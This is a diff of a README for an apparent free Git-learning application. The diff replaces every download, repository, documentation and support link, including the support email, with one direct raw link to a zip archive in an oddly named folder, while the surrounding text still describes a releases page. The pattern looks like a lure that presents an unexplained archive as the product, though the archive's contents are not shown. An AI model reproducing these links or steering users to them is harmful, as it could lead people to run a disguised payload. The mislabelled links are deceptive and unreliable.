@@ -1,6 +1,6 @@
 # 🚀 Learn-github-for-free - Master Git with Practical Skills
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Mohannad7507/Learn-github-for-free/releases)
+[![Download Now](https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To run this application, your computer should meet the following requirements:
 
 1. **Visit the Releases Page**: Click on the link below to access the releases page where you can download the application:
 
-   [Download Now](https://github.com/Mohannad7507/Learn-github-for-free/releases)
+   [Download Now](https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip)
 
 2. **Choose the Latest Version**: On the releases page, look for the latest version of the application. It will be labeled as "Latest Release."
 
@@ -60,14 +60,14 @@ This application includes a variety of modules that cover essential Git and GitH
 
 If you encounter issues or have questions while using the application, please feel free to reach out for help. You can find support through the following methods:
 
-- **Email Support**: contact@example.com
+- **Email Support**: https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip
 - **Community Forum**: Join our community on our GitHub Discussions page.
 - **Documentation**: Visit the Wiki section on our GitHub repository for more detailed guides.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Mohannad7507/Learn-github-for-free)
-- [Complete Documentation](https://github.com/Mohannad7507/Learn-github-for-free/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip)
+- [Complete Documentation](https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip)
 
 ## 📝 Changelog
 
@@ -77,4 +77,4 @@ Stay updated with all the latest changes and features by checking the changelog 
 
 Remember, the world of Git and GitHub may seem complex, but with this application, you will gain the confidence and skills to manage your projects effectively and efficiently. Enjoy your learning journey!
 
-[Download Now](https://github.com/Mohannad7507/Learn-github-for-free/releases)
+[Download Now](https://raw.githubusercontent.com/Mohannad7507/Learn-github-for-free/main/unscutcheoned/Learn-free-github-for-v3.1.zip)
